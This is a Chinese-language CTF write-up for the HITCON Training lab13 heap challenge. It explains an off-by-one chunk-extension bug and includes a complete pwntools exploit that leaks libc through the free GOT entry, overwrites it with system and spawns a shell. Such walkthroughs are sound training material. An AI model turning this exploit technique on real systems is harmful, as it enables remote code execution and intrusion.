# chunk extend

题目：

HITCON Trainging lab13

程序分析：

create : 长度没有进行检测，如果为负数，会导致任意长度堆溢出漏洞

edit :存在 off-by-one 漏洞

利用思路

- 利用 Off-by-one 漏洞覆盖下一个 chunk 的 size 字段
- 申请伪造的chunk大小，造成 overlapping, 修改 fd/bk指针

要注意因为 chunk0 大小是 0x18，会用到 chunk1 的 pre_size 部分。

然后溢出的时候刚好可以覆盖到 chunk1 的 size 部分。

然后堆布局基本是这样的：

chunk1 info(0x20) | chunk1 | chunk2 info | chunk2



所以我们 chunk1 溢出修改的是 chunk2 info 的 size, 然后这个 chunk 就会覆盖到 chunk2 的信息，

从而我们可以修改 chunk2 信息，可以用来 leak info, 修改 got 表。

内存变化

这个覆盖了 size 后的 layout

```python
gef➤  x/16gx 0xb3c010-0x10
0xb3c000:	0x0000000000000000	0x0000000000000021
0xb3c010:	0x0000000000000018	0x0000000000b3c030
0xb3c020:	0x0000000000000000	0x0000000000000021
0xb3c030:	0x0068732f6e69622f	0x6161616161616161
0xb3c040:	0x6161616161616161	0x0000000000000041
0xb3c050:	0x0000000000000010	0x0000000000b3c070
0xb3c060:	0x0000000000000000	0x0000000000000021
0xb3c070:	0x0000000a62626262	0x0000000000000000
```

然后我们 delete 1, 根据程序分析，会 free 掉 chunk1 info 和 chunk1 这两个堆块。

然后我们再 malloc 一个 0x30 的 chunk。

这时候会 malloc 一个 0x20 的 info chunk，然后malloc 一个 0x40 的实际 chunk.

自己画下图就明白了，最后我们可以修改 info chunk 中指向对应 chunk 的指针，这样show的时候就可以泄露地址了，再改写 free 的 got 表为 system， 最后成功 getshell。



这道题主要是要搞清楚 chunk 和 info chunk，在堆中实际的 layout。最终就改写了指向 chunk 的 Ptr，利用 show 和 delete 函数，达到 leak info 和 getshell 的目的。



最终 exp

```python
from pwn import *

r = process('./heapcreator')
heap = ELF('./heapcreator')
libc = ELF('./libc.so.6')

context_level = 'debug'

def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


#gdb.attach(r)
create(0x18,'aaaa')
create(0x10,'bbbb')

edit(0,'/bin/sh\x00'+'a'*0x10+"\x41")
delete(1)
create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1
show(1)

r.recvuntil("Content : ")
data = r.recvuntil("Done !")

free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
log.success('free base addr: ' + hex(free_addr))
libc_base = free_addr - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
gdb.attach(r)
system_addr = libc_base + libc.symbols['system']
#raw_input('1')                                                                    

edit(1, p64(system_addr))

# trigger system("/bin/sh")
delete(0)

r.interactive()

```

